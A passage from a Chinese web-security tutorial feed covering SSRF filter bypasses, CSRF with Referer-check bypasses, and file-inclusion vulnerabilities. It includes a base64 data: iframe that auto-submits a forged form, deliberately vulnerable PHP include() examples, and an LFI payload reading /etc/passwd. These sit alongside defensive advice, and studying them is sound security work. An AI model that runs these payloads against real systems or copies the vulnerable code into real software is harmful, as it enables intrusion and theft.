<code>http://www.hackersb.cn/redirect.php?url=http://192.168.0.1/</code></p>\n<p>4. 短网址绕过  <code>http://t.cn/RwbLKDx</code></p>\n<p>短网址原理请参考<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy52ZXJ5aXRtYW4uY29tLzIwMTkvMTEvMjQvJUU3JTlGJUFEJUU1JTlDJUIwJUU1JTlEJTgwJUU1JThFJTlGJUU3JTkwJTg2Lw==\"> http://www.veryitman.com/2019/11/24 / 短地址原理 /</span></p>\n<p>5.xip.io 来绕过： <code>http://xxx.192.168.0.1.xip.io/ == 192.168.0.1 (xxx 任意）</code></p>\n<p>指向任意 ip 的域名：<span class=\"exturl\" data-url=\"aHR0cDovL3hpcC5pbw==\">xip.io</span> (37signals 开发实现的定制 DNS 服务)</p>\n<p>6. 限制了子网段，可以加 :80 端口绕过。 <code>http://tieba.baidu.com/f/commit/share/openShareApi?url=http://10.42.7.78:80</code></p>\n<p>7. 探测内网域名，或者将自己的域名解析到内网 ip</p>\n<p>8. 例如  <code>http://10.153.138.81/ts.php</code>  , 修复时容易出现的获取 host 时以 / 分割来确定 host，</p>\n<p>但这样可以用  <code>http://abc@10.153.138.81/</code>  绕过</p>\n<p>9. 利用 Enclosed alphanumerics</p>\n<pre><code class=\"language-txt\">利用Enclosed alphanumerics\nⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  &gt;&gt;&gt;  example.com\nList:\n① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ \n⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ \n⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ \n⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ \nⒶ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ \nⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ \n⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ \n⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿\n</code></pre>\n<h1 id=\"漏洞示例\"><a class=\"anchor\" href=\"#漏洞示例\">#</a> 漏洞示例</h1>\n<p>1.Wordpress3.5.1 以下版本 xmlrpc.php pingback 的缺陷与 ssrf</p>\n<p>2.discuz！的 ssrf （利用 php 的 header 函数来绕过，其实就是 302 跳转实现协议转换）</p>\n<p>3.weblogic 的 ssrf</p>\n<p>.....</p>\n<h1 id=\"漏洞修复\"><a class=\"anchor\" href=\"#漏洞修复\">#</a> 漏洞修复</h1>\n<p>1. 禁止跳转</p>\n<p>2. 过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果 web 应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p>\n<p>3. 禁用不需要的协议，仅仅允许 http 和 https 请求。可以防止类似于 file://, gopher://, ftp:// 等引起的问题</p>\n<p>4. 设置 URL 白名单或者限制内网 IP（使用 gethostbyname () 判断是否为内网 IP）</p>\n<p>5. 限制请求的端口为 http 常用的端口，比如 80、443、8080、8090</p>\n<p>6. 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p>\n<h1 id=\"reference\"><a class=\"anchor\" href=\"#reference\">#</a> Reference</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMjExNQ==\">https://xz.aliyun.com/t/2115</span><br />\n<span class=\"exturl\" data-url=\"aHR0cDovL2JvYmFvLjM2MC5jbi9sZWFybmluZy9kZXRhaWwvMjQwLmh0bWw=\">http://bobao.360.cn/learning/detail/240.html</span><br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2VjcHVsc2UuY29tL2FyY2hpdmVzLzY1ODMyLmh0bWw=\">https://www.secpulse.com/archives/65832.html</span></p>\n",
            "tags": [
                "SSRF"
            ]
        },
        {
            "id": "https://or0kit.github.io/PenetrationTest/Web-Security/web%E6%BC%8F%E6%B4%9E-CSRF/",
            "url": "https://or0kit.github.io/PenetrationTest/Web-Security/web%E6%BC%8F%E6%B4%9E-CSRF/",
            "title": "web漏洞-CSRF",
            "date_published": "2021-02-01T11:53:47.000Z",
            "content_html": "<h1 id=\"csrf概念\"><a class=\"anchor\" href=\"#csrf概念\">#</a> CSRF 概念</h1>\n<p>CSRF 跨站点请求伪造 (Cross—Site Request Forgery)，跟 XSS 攻击一样，存在巨大的危害性，你可以这样来理解：</p>\n<blockquote>\n<p>攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚至于购买商品、虚拟货币转账等。 如下：其中 Web A 为存在 CSRF 漏洞的网站，Web B 为攻击者构建的恶意网站，User C 为 Web A 网站的合法用户。尽管听起来跟 XSS 跨站脚本攻击有点相似，但事实上 CSRF 与 XSS 差别很大，XSS 利用的是站点内的信任用户，而 CSRF 则是通过伪装来自受信任用户的请求来利用受信任的网站。</p>\n</blockquote>\n<h1 id=\"csrf攻击示意图\"><a class=\"anchor\" href=\"#csrf攻击示意图\">#</a> CSRF 攻击示意图</h1>\n<p><img data-src=\"image001.png\" alt=\"\" /></p>\n<p>首先用户 C 浏览并登录了受信任站点 A；<br />\n登录信息验证通过以后，站点 A 会在返回给浏览器的信息中带上已登录的 cookie，cookie 信息会在浏览器端保存一定时间（根据服务端设置而定）；<br />\n完成这一步以后，用户在没有登出（清除站点 A 的 cookie）站点 A 的情况下，访问恶意站点 B；<br />\n这时恶意站点 B 的某个页面向站点 A 发起请求，而这个请求会带上浏览器端所保存的站点 A 的 cookie；<br />\n站点 A 根据请求所带的 cookie，判断此请求为用户 C 所发送的。<br />\n因此，站点 A 会报据用户 C 的权限来处理恶意站点 B 所发起的请求，而这个请求可能以用户 C 的身份发送 邮件、短信、消息，以及进行转账支付等操作，这样恶意站点 B 就达到了伪造用户 C 请求站点 A 的目的。<br />\n受害者只需要做下面两件事情，攻击者就能够完成 CSRF 攻击：</p>\n<ol>\n<li>登录受信任站点 A，并在本地生成 cookie；</li>\n<li>在不登出站点 A（清除站点 A 的 cookie）的情况下，访问恶意站点 B。</li>\n</ol>\n<p>很多情况下所谓的恶意站点，很有可能是一个存在其他漏洞（如 XSS）的受信任且被很多人访问的站点，这样，普通用户可能在不知不觉中便成为了受害者。</p>\n<h1 id=\"csrf漏洞检测\"><a class=\"anchor\" href=\"#csrf漏洞检测\">#</a> CSRF 漏洞检测：</h1>\n<p>检测 CSRF 漏洞是一项比较繁琐的工作，最简单的方法就是抓取一个正常请求的数据包，去掉 Referer 字段后再重新提交，如果该提交还有效，那么基本上可以确定存在 CSRF 漏洞。</p>\n<p>随着对 CSRF 漏洞研究的不断深入，不断涌现出一些专门针对 CSRF 漏洞进行检测的工具，如 CSRFTester，CSRF Request Builder 等。</p>\n<p>以 CSRFTester 工具为例，CSRF 漏洞检测工具的测试原理如下：使用 CSRFTester 进行测试时，首先需要抓取我们在浏览器中访问过的所有链接以及所有的表单等信息，然后通过在 CSRFTester 中修改相应的表单等信息，重新提交，这相当于一次伪造客户端请求。如果修改后的测试请求成功被网站服务器接受，则说明存在 CSRF 漏洞，当然此款工具也可以被用来进行 CSRF 攻击。</p>\n<p>客户端访问服务器时没有同服务器做安全验证</p>\n<p>一切 http 参数可控</p>\n<p>详细 CSRF 检测见<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxOTAxMTIyL2FydGljbGUvZGV0YWlscy8xMDY0MDg3MTQ=\"> https://blog.csdn.net/qq_41901122/article/details/106408714</span></p>\n<h1 id=\"防御csrf攻击\"><a class=\"anchor\" href=\"#防御csrf攻击\">#</a> 防御 CSRF 攻击</h1>\n<h2 id=\"尽量使用post限制get\"><a class=\"anchor\" href=\"#尽量使用post限制get\">#</a> 尽量使用 POST，限制 GET</h2>\n<p>GET 接口太容易被拿来做 CSRF 攻击，看上面示例就知道，只要构造一个 img 标签，而 img 标签又是不能过滤的数据。接口最好限制为 POST 使用，GET 则无效，降低攻击风险。<br />\n当然 POST 并不是万无一失，攻击者只要构造一个 form 就可以，但需要在第三方页面做，这样就增加暴露的可能性。</p>\n<h2 id=\"将cookie设置为httponly\"><a class=\"anchor\" href=\"#将cookie设置为httponly\">#</a> 将 cookie 设置为 HttpOnly</h2>\n<p>CRSF 攻击很大程度上是利用了浏览器的 cookie，为了防止站内的 XSS 漏洞盗取 cookie, 需要在 cookie 中设置 “HttpOnly” 属性，这样通过程序（如 JavaScript 脚本、Applet 等）就无法读取到 cookie 信息，避免了攻击者伪造 cookie 的情况出现。<br />\n在 Java 的 Servlet 的 API 中设置 cookie 为 HttpOnly 的代码如下：<br />\n <code>response.setHeader( &quot;Set-Cookie&quot;, &quot;cookiename=cookievalue;HttpOnly&quot;);</code></p>\n<h2 id=\"增加token\"><a class=\"anchor\" href=\"#增加token\">#</a> 增加 token</h2>\n<p>CSRF 攻击之所以能够成功，是因为攻击者可以伪造用户的请求，该请求中所有的用户验证信息都存在于 cookie 中，因此攻击者可以在不知道用户验证信息的情况下直接利用用户的 cookie 来通过安全验证。由此可知，抵御 CSRF 攻击的关键在于：在请求中放入攻击者所不能伪造的信息，并且该信总不存在于 cookie 之中。鉴于此，系统开发人员可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务端进行 token 校验，如果请求中没有 token 或者 token 内容不正确，则认为是 CSRF 攻击而拒绝该请求。<br />\n假设请求通过 POST 方式提交，则可以在相应的表单中增加一个隐藏域：<br />\n <code>&lt;input type=&quot;hidden&quot; name=&quot;_toicen&quot; value=&quot;tokenvalue&quot;/&gt;</code> <br />\ntoken 的值通过服务端生成，表单提交后 token 的值通过 POST 请求与参数一同带到服务端，每次会话可以使用相同的 token，会话过期，则 token 失效，攻击者因无法获取到 token，也就无法伪造请求。<br />\n在 session 中添加 token 的实现代码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>HttpSession session <span class=\"token operator\">=</span> request<span class=\"token operator\">.</span><span class=\"token function\">getSession</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword type-declaration\">Object</span> token <span class=\"token operator\">=</span> session<span class=\"token operator\">.</span><span class=\"token function\">getAttribute</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"_token\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>token <span class=\"token operator\">==</span> <span class=\"token constant\">null</span> <span class=\"token constant\">I</span> <span class=\"token constant\">I</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token operator\">.</span><span class=\"token function\">equals</span><span class=\"token punctuation\">(</span>token<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    session<span class=\"token operator\">.</span><span class=\"token function\">setAttribute</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"_token\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">UUID</span><span class=\"token operator\">.</span>randomUUIDO <span class=\"token operator\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"通过referer识别\"><a class=\"anchor\" href=\"#通过referer识别\">#</a> 通过 Referer 识别</h2>\n<p>根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。在通常情况下，访问一个安全受限的页面的请求都来自于同一个网站。比如某银行的转账是通过用户访问 <code>http://www.xxx.com/transfer.do</code>  页面完成的，用户必须先登录 <code>www.xxx.com</code> ，然后通过单击页面上的提交按钮来触发转账事件。当用户提交请求时，该转账请求的 Referer 值就会是<br />\n提交按钮所在页面的 URL（本例为 <code>www.xxx. com/transfer.do</code> ）。如果攻击者要对银行网站实施 CSRF 攻击，他只能在其他网站构造请求，当用户通过其他网站发送请求到银行时，该请求的 Referer 的值是其他网站的地址，而不是银行转账页面的地址。因此，要防御 CSRF 攻击，银行网站只需要对于每一个转账请求验证其 Referer 值即可，如果是以 <code>www.xx.om</code>  域名开头的地址，则说明该请求是来自银行网站自己的请求，是合法的；如果 Referer 是其他网站，就有可能是 CSRF 攻击，则拒绝该请求。<br />\n取得 HTTP 请求 Referer：<br />\n <code>String referer = request.getHeader(&quot;Referer&quot;);</code></p>\n<h1 id=\"csrf-绕过referer技巧\"><a class=\"anchor\" href=\"#csrf-绕过referer技巧\">#</a> CSRF-- 绕过 Referer 技巧</h1>\n<p>CSRF 遇到 Referer 绕过的情况，有条件限制，不一定所有的 Refere 验证就可以绕过</p>\n<h2 id=\"referer条件为空条件时\"><a class=\"anchor\" href=\"#referer条件为空条件时\">#</a> referer 条件为空条件时</h2>\n<p>解决方案:</p>\n<p>利用 <code>ftp://, http://, https://, file://, javascript:, data: </code> <br />\n这个时候浏览器地址栏是 <code>file://</code>  开头的，如果这个 HTML 页面向任何 http 站点提交请求的话，这些请求的 Referer 都是空的。</p>\n<p><span class=\"label\">例:</span></p>\n<ol>\n<li>利用 data: 协议</li>\n</ol>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>iframe</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>data:text/html;base64,PGZvcm0gbWV0aG9kPXBvc3QgYWN0aW9uPWh0dHA6Ly9hLmIuY29tL2Q+PGlucHV0IHR5cGU9dGV4dCBuYW1lPSdpZCcgdmFsdWU9JzEyMycvPjwvZm9ybT48c2NyaXB0PmRvY3VtZW50LmZvcm1zWzBdLnN1Ym1pdCgpOzwvc2NyaXB0Pg==<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p>bese64 编码 解码即可看到代码</p>\n<ol start=\"2\">\n<li>利用 https 协议</li>\n</ol>\n<p>https 向 http 跳转的时候 Referer 为空<br />\n拿一个 https 的 webshell<br />\n <code>&lt;iframe src=&quot;https://xxxxx.xxxxx/attack.php&quot;&gt;</code></p>\n<p>attack.php 写上 CSRF 攻击代码</p>\n<h2 id=\"判断referer是某域情况下绕过\"><a class=\"anchor\" href=\"#判断referer是某域情况下绕过\">#</a> 判断 Referer 是某域情况下绕过</h2>\n<p>比如你找的 csrf 是 <code>http://xxx.com</code>  验证的 referer 是验证的 <code>*.http://xx.com</code>  可以找个二级域名 之后 <code>&lt;img &quot;csrf地址&quot;&gt;</code>  之后在把文章地址发出去 就可以伪造。</p>\n<h2 id=\"判断referer是否存在某关键字\"><a class=\"anchor\" href=\"#判断referer是否存在某关键字\">#</a> 判断 referer 是否存在某关键字</h2>\n<p>referer 判断存在不存在 <code>http://google.com</code>  这个关键词</p>\n<p>在网站新建一个 <code>http://google.com</code>  目录 把 CSRF 存放在 <code>http://google.com</code>  目录，即可绕过</p>\n<h2 id=\"判断referer是否含有某域名\"><a class=\"anchor\" href=\"#判断referer是否含有某域名\">#</a> 判断 referer 是否含有某域名</h2>\n<p>判断了 Referer 开头是否以 <code>http://126.com</code>  以及 126 子域名 不验证根域名为 <code>http://126.com</code>  那么我这里可以构造子域名 <code>http://x.126.com.xxx.com</code>  作为蠕虫传播的载体服务器，即可绕过。</p>\n<h1 id=\"reference\"><a class=\"anchor\" href=\"#reference\">#</a> Reference</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC82NzQwOGQ3M2M2NmQ=\">https://www.jianshu.com/p/67408d73c66d</span><br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNjA2OTczL2FydGljbGUvZGV0YWlscy84NjUwNDc0Nw==\">https://blog.csdn.net/qq_41606973/article/details/86504747</span><br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRjaGF0LmNzZG4ubmV0L2FjdGl2aXR5LzVhMGJhMzQ3ZTFmNzU1NTcxNDgzZWE1YQ==\">https://gitchat.csdn.net/activity/5a0ba347e1f755571483ea5a</span><br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vRmx1b3Jlc2NlbmNlLXRqeS9wLzYxMDAzMTAuaHRtbA==\">https://www.cnblogs.com/Fluorescence-tjy/p/6100310.html</span></p>\n",
            "tags": [
                "CSRF"
            ]
        },
        {
            "id": "https://or0kit.github.io/PenetrationTest/Web-Security/web%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/",
            "url": "https://or0kit.github.io/PenetrationTest/Web-Security/web%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/",
            "title": "web漏洞-文件包含",
            "date_published": "2021-01-20T04:12:47.000Z",
            "content_html": "<h1 id=\"文件包含漏洞简介\"><a class=\"anchor\" href=\"#文件包含漏洞简介\">#</a> 文件包含漏洞简介</h1>\n<ol>\n<li>\n<p>什么是文件包含漏洞？<br />\n程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某些函数时，直接调用此文件，无需再次编写，这种调用文件的过程一般被称为文件包含。</p>\n</li>\n<li>\n<p>文件包含漏洞的成因<br />\n随着网站业务的需求，程序开发人员一般希望代码更灵活，所以将被包含的文件设置为<ins class=\"primary\">变量</ins>，用来进行动态调用，用户可以对<ins class=\"primary\">变量的值可控</ins>而服务器端未对变量值进行合理地校验或者校验被绕过，这样就导致了文件包含漏洞。通常文件包含漏洞出现在 PHP 语言中。</p>\n<ul>\n<li>php 中常见包含文件的函数\n<ul>\n<li>include () 当使用该函数包含文件时，只有代码执行到 include () 函数时才将文件包含进来，发生错误时之给出一个警告，继续<ins class=\"primary\">向下执行</ins>。</li>\n<li>include_once () 功能与 Include () 相同，区别在于当重复调用同一文件时，<ins class=\"primary\">程序只调用一次</ins></li>\n<li>require () require () 与 include () 的区别在于 require () 执行如果发生错误，函数会输出错误信息，并<ins class=\"primary\">终止脚本的运行</ins>。</li>\n<li>require_once () 功能与 require () 相同，区别在于当重复调用同一文件时，<ins class=\"primary\">程序只调用一次</ins></li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<p>文件包含漏洞的分类</p>\n<p>文件包含漏洞可以分为 RFI (远程文件包含) 和 LFI（本地文件包含漏洞）两种。而区分他们最简单的方法就是 php.ini 中是否开启了 allow_url_include。如果开启 了我们就有可能包含远程文件。</p>\n<p>1、本地文件包含 LFI (Local File Include)</p>\n<p>2、远程文件包含 RFI (Remote File Include)（需要 php.ini 中 allow_url_include=on、allow_url_fopen = On）</p>\n<p>在 php.ini 中，allow_url_fopen 默认一直是 On，而 allow_url_include 从 php5.2 之后就默认为 Off。</p>\n</li>\n<li>\n<p>文件包含漏洞的危害</p>\n<ul>\n<li>配合文件上传漏洞 GetShell</li>\n<li>可以执行任意脚本代码</li>\n<li>网站源码文件以及配置文件泄露</li>\n<li>远程包含 GetShell</li>\n<li>控制整个网站甚至是服务器</li>\n</ul>\n</li>\n</ol>\n<h1 id=\"常见漏洞环境\"><a class=\"anchor\" href=\"#常见漏洞环境\">#</a> 常见漏洞环境</h1>\n<p>了解这些主要是为了绕过</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"><span>示例</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span>page<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span> </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">include</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span>page<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">include</span> <span class=\"token string single-quoted-string\">'show.php'</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span>page<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'./action/'</span><span class=\"token operator\">.</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span>page<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">include</span> <span class=\"token string single-quoted-string\">'./action/show.php'</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span> <span class=\"token punctuation\">[</span>page<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">&#123;</span> </pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'./action/'</span><span class=\"token operator\">.</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span>page<span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">include</span> <span class=\"token string single-quoted-string\">'./action/show.php'</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><h1 id=\"本地文件包含\"><a class=\"anchor\" href=\"#本地文件包含\">#</a> 本地文件包含</h1>\n<h2 id=\"无限制本地文件包含\"><a class=\"anchor\" href=\"#无限制本地文件包含\">#</a> 无限制本地文件包含</h2>\n<p>这种直接找我们到需要的文件路径，进行包含就行。</p>\n<p><span class=\"label\">示例</span></p>\n<p><img data-src=\"image001.png\" alt=\"\" /></p>\n<h2 id=\"有限制本地文件包含\"><a class=\"anchor\" href=\"#有限制本地文件包含\">#</a> 有限制本地文件包含</h2>\n<p>这种类型需要我们找到的敏感文件路径，然后<ins class=\"info\">绕过限制</ins>进行包含就行。</p>\n<h3 id=\"00截断\"><a class=\"anchor\" href=\"#00截断\">#</a> %00 截断</h3>\n<p>条件：magic_quotes_gpc = Off php 版本 &lt; 5.3.4</p>\n<p>在上面常见环境代码的后两种都得用 %00 截断</p>\n<p><span class=\"label warning\">示例</span><br />\n <code>http://www.xxx.com/xx.php?filename=../../etc/passwd%00</code></p>\n<h3 id=\"路径长度截断\"><a class=\"anchor\" href=\"#路径长度截断\">#</a> 路径长度截断</h3>\n<p>条件：windows OS，点号需要长于 256；linux OS 长于 4096</p>\n<p>Windows 下目录最大长度为 256 字节，超出的部分会被丢弃；</p>\n<p>Linux 下目录最大长度为 4096 字节，超出的部分会被丢弃。</p>\n<p>测试代码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token variable\">$filename</span>  <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'filename'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filename</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\".html\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><div class=\"tab\" data-id=\"id1\" data-title=\"EXP:\">\n<p><span class=\"exturl\" 